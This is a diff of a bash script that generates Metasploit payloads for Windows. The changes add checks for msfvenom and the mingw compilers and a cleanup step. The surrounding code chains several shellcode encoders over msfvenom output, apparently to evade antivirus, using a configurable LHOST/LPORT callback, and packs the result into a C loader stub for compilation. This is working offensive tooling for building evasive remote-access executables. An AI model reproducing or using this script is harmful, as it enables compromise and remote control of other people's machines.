@@ -73,16 +73,32 @@ if [ ! -d "$fpath" ]; then
         exit 1
 fi
 
-# Note: changing stage1.c -> payload.c
+# msfvenom check
+if [ ! -n "$(which msfvenom)" ]; then
+	echo -e "\e[0;31mError: Failed to find msfvenom. Do you have Metasploit installed?\e[0m"
+	exit 1
+fi
 
 # Generate payload blob (raw byte buffer to insert into C loader stub) via msfvenom (previously used msfpayload)
 if [ "$iface" != "" ]; then echo -e "\e[0;36mIP/DDNS\e[0m: \e[0;33m$IP\e[0m"; fi
 echo -e "$tag Generating payload blob..."
 if [[ $pay != *x64* ]]; then
+	# Mingw32 check
+	if [ ! -n "$(which i586-mingw32msvc-gcc)" ]; then
+		echo -e "\e[0;31mError: Failed to find i586-mingw32msvc-gcc. Try \"apt-get install gcc-mingw32\"\e[0m"
+		exit 1
+	fi
+
 	# x86 has way more compatible encoders so we can run it through a bunch of times
 	msfvenom -p $pay --arch x86 --platform Windows LHOST=$IP LPORT=$port EXITFUNC=process 2> /dev/null | msfencode -e x86/shikata_ga_nai -c $encit -t raw 2> /dev/null | msfencode -e x86/jmp_call_additive -c $encit -t raw 2> /dev/null | msfencode -e x86/call4_dword_xor -c $encit -t raw 2> /dev/null | msfencode -e x86/shikata_ga_nai -c $encit 2> /dev/null 1> payload.c
 	sed -e 's/\s+\|buf\s=\s//g' payload.c | sed -e '$a;' > buffer.c
 else
+	# Mingw64 check
+	if [ ! -n "$(which i686-w64-mingw32-gcc)" ]; then
+		echo -e "\e[0;31mError: Failed to find i686-w64-mingw32-gcc. Try \"apt-get install gcc-mingw32\"\e[0m"
+		exit 1
+	fi
+
 	msfvenom -p $pay -f c --arch x86_64 --platform Windows -e x64/xor -i $encit LHOST=$IP LPORT=$port EXITFUNC=process 2> /dev/null 1> payload.c
 	sed -e 's/unsigned char buf\[\] =//g' payload.c > buffer.c
 fi
@@ -159,6 +175,7 @@ if [ -e "tmp.o" ]; then
 		rm -f payload.c
 		rm -f buffer.c
 		rm -f final.c
+		rm -f tmp.o
 		cd ..
 		rm -f .msfpayload
 
